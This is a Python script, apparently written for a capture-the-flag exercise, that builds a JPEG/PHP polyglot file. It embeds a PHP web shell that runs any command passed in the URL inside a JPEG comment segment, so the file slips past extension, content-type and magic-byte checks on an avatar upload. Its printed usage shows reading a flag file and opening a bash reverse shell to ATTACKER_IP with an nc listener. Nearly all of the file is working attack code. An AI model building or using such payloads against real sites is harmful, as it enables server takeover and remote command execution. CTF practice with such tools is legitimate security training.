"""
Generateur de payload polyglotte JPEG/PHP pour CTF.
Cree un fichier .jpg avec :
- Magic bytes JPEG valides (FF D8 FF E0 + header JFIF minimal)
- Code PHP embarque apres le header
- Le fichier passe les 4 couches de validation du forum :
  1. Extension .jpg (whitelist)
  2. Content-Type detecte comme image/jpeg (magic bytes)
  3. Magic bytes JPEG valides
  4. Validation JS cote client (trivial a bypass)
- Seule la verification profonde du contenu (couche 5) detecterait le PHP
"""

import sys

def generate_polyglot(output_file='payload.jpg'):
    # Header JPEG minimal valide
    # FF D8 FF E0 = Start Of Image + APP0 marker
    # 00 10 = longueur du segment APP0 (16 bytes)
    # 4A 46 49 46 00 = "JFIF\0"
    # 01 01 = version JFIF 1.1
    # 00 = densite en pixels
    # 00 01 00 01 = 1x1 pixel
    # 00 00 = pas de thumbnail
    jpeg_header = bytes([
        0xFF, 0xD8, 0xFF, 0xE0,  # SOI + APP0
        0x00, 0x10,              # Longueur segment (16 bytes)
        0x4A, 0x46, 0x49, 0x46, 0x00,  # "JFIF\0"
        0x01, 0x01,              # Version 1.1
        0x00,                    # Densite pixels
        0x00, 0x01,              # X density = 1
        0x00, 0x01,              # Y density = 1
        0x00, 0x00,              # No thumbnail
    ])

    # Commentaire JPEG contenant le payload PHP
    # FF FE = COM marker (commentaire JPEG)
    php_payload = b'<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
    comment_length = len(php_payload) + 2  # +2 pour le champ longueur lui-meme
    jpeg_comment = bytes([0xFF, 0xFE]) + comment_length.to_bytes(2, 'big') + php_payload

    # Footer JPEG minimal (End Of Image)
    jpeg_footer = bytes([0xFF, 0xD9])

    # Assemblage du fichier polyglotte
    polyglot = jpeg_header + jpeg_comment + jpeg_footer

    with open(output_file, 'wb') as f:
        f.write(polyglot)

    print(f'[OK] Payload polyglotte genere : {output_file}')
    print(f'     Taille : {len(polyglot)} bytes')
    print(f'     Magic bytes : {polyglot[:4].hex().upper()}')
    print(f'     Format : JPEG/JFIF avec payload PHP dans commentaire COM')
    print()
    print('Usage CTF :')
    print('  1. Upload le fichier comme avatar sur le forum')
    print('  2. Accede au fichier avec ?cmd=<commande>')
    print('     Exemple : /uploads/user_2_payload.jpg?cmd=cat /root/flag.txt')
    print('  3. Reverse shell :')
    print('     /uploads/user_2_payload.jpg?cmd=bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')
    print('     (ecoute avec : nc -lvnp 4444)')

    return output_file


if __name__ == '__main__':
    output = sys.argv[1] if len(sys.argv) > 1 else 'payload.jpg'
    generate_polyglot(output)
